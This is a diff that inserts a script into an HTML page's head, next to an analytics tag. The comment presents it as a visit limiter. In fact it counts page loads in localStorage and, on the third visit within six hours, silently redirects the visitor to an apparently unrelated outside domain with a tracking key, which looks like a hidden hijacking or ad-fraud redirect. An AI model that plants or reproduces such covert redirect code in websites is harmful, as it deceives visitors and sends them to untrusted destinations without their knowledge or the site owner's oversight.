@@ -10,6 +10,55 @@
 
   gtag('config', 'G-86ZEVY6P1Z');
 </script>
+
+<script>
+(function () {
+  "use strict";
+
+  const KEY = "site_visit_limit_v1";
+  const LIMIT = 2;
+  const TIME = 6 * 60 * 60 * 1000; // 6 hours
+  const REDIRECT_URL = "https://cariousthoughtearl.com/a7i9gkb2f?key=04135132b4da1f1389e21994b5a1cfd0";
+
+  try {
+    const now = Date.now();
+    let data = null;
+
+    try {
+      data = JSON.parse(localStorage.getItem(KEY));
+    } catch (e) {
+      data = null;
+    }
+
+    // Reset after 6 hours
+    if (
+      !data ||
+      typeof data.start !== "number" ||
+      typeof data.count !== "number" ||
+      now - data.start >= TIME
+    ) {
+      data = {
+        start: now,
+        count: 0
+      };
+    }
+
+    // Count the visit
+    data.count++;
+
+    localStorage.setItem(KEY, JSON.stringify(data));
+
+    // Redirect on the 3rd visit
+    if (data.count > LIMIT) {
+      window.location.replace(REDIRECT_URL);
+    }
+
+  } catch (e) {
+    console.log("Visit limiter error:", e);
+  }
+})();
+</script>
+  
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta name="theme-color" content="#000000">
